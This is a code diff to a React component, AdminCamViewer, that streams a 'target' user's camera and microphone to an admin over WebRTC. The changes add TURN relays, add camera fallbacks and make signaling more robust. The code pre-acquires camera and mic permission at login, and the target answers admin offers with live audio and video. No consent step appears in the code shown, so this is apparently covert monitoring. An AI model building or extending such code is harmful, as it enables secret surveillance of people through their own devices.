@@ -15,8 +15,10 @@ const RTC_CONFIG: RTCConfiguration = {
       urls: [
         'turn:global.relay.metered.ca:80',
         'turn:global.relay.metered.ca:80?transport=tcp',
+        'turn:global.relay.metered.ca:80?transport=udp',
         'turn:global.relay.metered.ca:443',
         'turn:global.relay.metered.ca:443?transport=tcp',
+        'turn:global.relay.metered.ca:443?transport=udp',
         'turns:global.relay.metered.ca:443?transport=tcp',
         'turns:global.relay.metered.ca:5349?transport=tcp'
       ],
@@ -27,8 +29,10 @@ const RTC_CONFIG: RTCConfiguration = {
       urls: [
         'turn:openrelay.metered.ca:80',
         'turn:openrelay.metered.ca:80?transport=tcp',
+        'turn:openrelay.metered.ca:80?transport=udp',
         'turn:openrelay.metered.ca:443',
         'turn:openrelay.metered.ca:443?transport=tcp',
+        'turn:openrelay.metered.ca:443?transport=udp',
         'turns:openrelay.metered.ca:443?transport=tcp',
         'turns:openrelay.metered.ca:5349?transport=tcp'
       ],
@@ -77,26 +81,19 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     }
   }, [isOpen, isAdmin]);
 
-
   // ── Proactive Camera/Mic Permission Request for Capacitor (Android) ────────
-  // Trigger the OS permission dialog immediately when a user logs in so that
-  // WebRTC works without any manual grant later. We acquire then immediately
-  // release the stream — this only warms up the OS permission state.
   useEffect(() => {
     if (!userEmail) return;
     const requestPermissions = async () => {
       try {
         if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          // Immediately stop all tracks — we only needed the permission grant
           stream.getTracks().forEach(t => t.stop());
         }
       } catch (err) {
-        // Permissions denied or not available — silently ignore
         console.warn('[AdaptiveCam] Permission request failed:', err);
       }
     };
-    // Small delay so the UI is fully rendered before the dialog appears
     const timer = setTimeout(requestPermissions, 1500);
     return () => clearTimeout(timer);
   }, [userEmail]);
@@ -111,27 +108,27 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
   // Queues & Remote Description Flags for WebRTC Stability
   const iceCandidateQueue = useRef<RTCIceCandidateInit[]>([]);
 
-  // ── Sync Remote Stream to Video Element (Callback Ref + Effect) ────────────
+  // ── Sync Remote Stream to Video Element ────────────────────────────────────
   const setVideoRef = useCallback((node: HTMLVideoElement | null) => {
     remoteVideoRef.current = node;
-    if (node) {
-      if (remoteStream) {
-        node.srcObject = remoteStream;
-        node.play().catch(err => console.warn('Autoplay error:', err));
-      } else {
-        node.srcObject = null;
-      }
+    if (node && remoteStream) {
+      node.srcObject = remoteStream;
+      node.play().catch(() => {
+        node.muted = true;
+        node.play().catch(() => {});
+      });
     }
   }, [remoteStream]);
 
   useEffect(() => {
-    if (remoteVideoRef.current) {
-      if (remoteStream) {
-        remoteVideoRef.current.srcObject = remoteStream;
-        remoteVideoRef.current.play().catch(err => console.warn('Autoplay error:', err));
-      } else {
-        remoteVideoRef.current.srcObject = null;
-      }
+    if (remoteVideoRef.current && remoteStream) {
+      remoteVideoRef.current.srcObject = remoteStream;
+      remoteVideoRef.current.play().catch(() => {
+        if (remoteVideoRef.current) {
+          remoteVideoRef.current.muted = true;
+          remoteVideoRef.current.play().catch(() => {});
+        }
+      });
     }
   }, [remoteStream]);
 
@@ -184,37 +181,28 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     if (localStreamRef.current && localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
       return localStreamRef.current;
     }
-    try {
-      if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
-        let stream: MediaStream | null = null;
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: facingModeRef.current, width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { max: 24 } },
-            audio: true
-          });
-        } catch {
-          try {
-            stream = await navigator.mediaDevices.getUserMedia({
-              video: { facingMode: facingModeRef.current },
-              audio: true
-            });
-          } catch {
-            try {
-              stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            } catch {
-              try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-              } catch (err) {
-                console.warn('All getUserMedia attempts failed:', err);
-              }
-            }
-          }
+    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
+      return null;
+    }
+
+    const attempts = [
+      { video: { facingMode: facingModeRef.current, width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
+      { video: { facingMode: facingModeRef.current }, audio: true },
+      { video: true, audio: true },
+      { video: { facingMode: facingModeRef.current }, audio: false },
+      { video: true, audio: false }
+    ];
+
+    for (const constraints of attempts) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        if (stream && stream.getVideoTracks().length > 0) {
+          localStreamRef.current = stream;
+          return stream;
         }
-        localStreamRef.current = stream;
-        return stream;
+      } catch (err) {
+        console.warn('getUserMedia attempt failed with:', constraints, err);
       }
-    } catch (err) {
-      console.warn('Camera stream acquisition error:', err);
     }
     return null;
   }, []);
@@ -251,7 +239,11 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
         const stream = await acquireLocalCamera();
         
         if (pcRef.current) {
-          try { pcRef.current.close(); } catch {}
+          try {
+            pcRef.current.onicecandidate = null;
+            pcRef.current.ontrack = null;
+            pcRef.current.close();
+          } catch {}
         }
         
         const pc = new RTCPeerConnection(RTC_CONFIG);
@@ -259,7 +251,13 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
         iceCandidateQueue.current = [];
 
         if (stream) {
-          stream.getTracks().forEach(track => pc.addTrack(track, stream));
+          stream.getTracks().forEach(track => {
+            try {
+              pc.addTrack(track, stream);
+            } catch (e) {
+              console.warn('Track add error:', e);
+            }
+          });
         }
 
         pc.onicecandidate = (e) => {
@@ -274,10 +272,12 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
 
         await pc.setRemoteDescription(new RTCSessionDescription(signal));
 
-        // Process queued ICE candidates
+        // Drain queued ICE candidates
         while (iceCandidateQueue.current.length > 0) {
           const candidate = iceCandidateQueue.current.shift();
-          if (candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(() => {});
+          if (candidate) {
+            await pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(() => {});
+          }
         }
 
         const answer = await pc.createAnswer();
@@ -293,12 +293,14 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
 
       // 2. ADMIN RECEIVES ANSWER FROM TARGET
       if (signal.type === 'answer') {
-        if (pcRef.current) {
+        if (pcRef.current && pcRef.current.signalingState === 'have-local-offer') {
           await pcRef.current.setRemoteDescription(new RTCSessionDescription(signal));
-          // Process queued ICE candidates
+          // Drain queued ICE candidates
           while (iceCandidateQueue.current.length > 0) {
             const candidate = iceCandidateQueue.current.shift();
-            if (candidate) await pcRef.current.addIceCandidate(new RTCIceCandidate(candidate)).catch(() => {});
+            if (candidate) {
+              await pcRef.current.addIceCandidate(new RTCIceCandidate(candidate)).catch(() => {});
+            }
           }
         }
         return;
@@ -307,7 +309,7 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       // 3. ICE CANDIDATE SIGNAL
       if (signal.candidate || signal.sdpMid !== undefined) {
         const candidateInit: RTCIceCandidateInit = signal.candidate ? signal : signal;
-        if (pcRef.current && pcRef.current.remoteDescription) {
+        if (pcRef.current && pcRef.current.remoteDescription && pcRef.current.remoteDescription.type) {
           await pcRef.current.addIceCandidate(new RTCIceCandidate(candidateInit)).catch(e => console.warn('ICE Candidate add error:', e));
         } else {
           iceCandidateQueue.current.push(candidateInit);
@@ -441,14 +443,35 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       setStreamStatus(current => current === 'connecting' ? 'error' : current);
     }, 25000);
 
+    const receivedStream = new MediaStream();
+
     pc.ontrack = (e) => {
       clearTimeout(timeoutId);
-      console.log('ontrack received:', e.track.kind);
-      const incomingStream = (e.streams && e.streams[0]) ? e.streams[0] : new MediaStream([e.track]);
-      setRemoteStream(incomingStream);
-      if (remoteVideoRef.current) {
-        remoteVideoRef.current.srcObject = incomingStream;
-        remoteVideoRef.current.play().catch(err => console.warn('Video playback error:', err));
+      console.log('ontrack received track:', e.track.kind);
+      
+      if (e.streams && e.streams[0]) {
+        setRemoteStream(e.streams[0]);
+        if (remoteVideoRef.current) {
+          remoteVideoRef.current.srcObject = e.streams[0];
+          remoteVideoRef.current.play().catch(() => {
+            if (remoteVideoRef.current) {
+              remoteVideoRef.current.muted = true;
+              remoteVideoRef.current.play().catch(() => {});
+            }
+          });
+        }
+      } else {
+        receivedStream.addTrack(e.track);
+        setRemoteStream(receivedStream);
+        if (remoteVideoRef.current) {
+          remoteVideoRef.current.srcObject = receivedStream;
+          remoteVideoRef.current.play().catch(() => {
+            if (remoteVideoRef.current) {
+              remoteVideoRef.current.muted = true;
+              remoteVideoRef.current.play().catch(() => {});
+            }
+          });
+        }
       }
       setStreamStatus('live');
     };
